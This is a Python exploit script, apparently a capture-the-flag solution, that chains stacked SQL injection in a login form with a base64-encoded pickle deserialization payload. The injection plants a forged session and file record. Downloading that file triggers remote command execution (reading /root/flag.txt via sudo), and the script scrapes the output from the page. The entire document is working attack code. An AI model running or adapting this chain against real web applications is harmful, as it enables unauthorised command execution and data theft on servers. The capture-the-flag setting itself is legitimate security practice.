import requests
import pickle
import base64
from bs4 import BeautifulSoup
import random

class RCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        cmd = f'flash(__import__("os").popen("{self.command}").read().strip()) or redirect(url_for("files"))'
        return eval, (cmd,)

def generate_payload(command):
    rce = RCE(command)
    pickled = pickle.dumps(rce)
    encoded_payload = base64.urlsafe_b64encode(pickled)
    # Convert bytes to string and remove leading/trailing characters
    encoded_payload = str(encoded_payload).replace("b'", "").replace("'", "")
    return encoded_payload

def create_sql_injection(session_id, filename, payload):
    parameters = (
        fr"username=\;%0AINSERT%0AOR%0AIGNORE%0AINTO%0Aactivesessions"
        fr"%0A(sessionid,%0Ausername,%0Atimestamp)%0AVALUES"
        fr"%0A(\{session_id}\,%0A\{session_id}\,%0A\{session_id}\);"
        fr"%0AINSERT%0AINTO%0Afiles%0A(filename,%0Adata,%0Asessionid)"
        fr"%0AVALUES%0A(\{filename}\,%0A\{payload}\,%0A\{session_id}\);--&password="
    )
    return parameters

def send_payload(url, parameters):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(f"{url}/login", data=parameters, headers=headers)
    return response

def extract_output(response_text):
    soup = BeautifulSoup(response_text, "html.parser")
    alert_div = soup.find("div", class_="mt-3 alert alert-danger")
    if alert_div:
        return alert_div.get_text(separator="\n", strip=True)
    else:
        return "No output found."

def main():
    url = "http://challenge.ctf.games:30328"  # Use your actual URL
    command = "sudo cat /root/flag.txt"
    filename = random.randint(1, 5000000)
    session_id = "HENRIK"

    filename = str(filename)
    session_id = str(session_id)

    # Generate the malicious payload
    payload = generate_payload(command)

    # Create the SQL injection parameters
    parameters = create_sql_injection(session_id, filename, payload)

    # Send the payload to the server
    response = send_payload(url, parameters)
    if response.status_code != 200:
        print("Failed to send payload to the server.")
        return

    # Access the file to trigger the payload execution
    response = requests.get(f"{url}/download/{filename}/{session_id}")
    if response.status_code != 200:
        print("Failed to retrieve the file.")
        return

    # Extract and print the output
    output = extract_output(response.text)
    print(output)

if __name__ == '__main__':
    main()
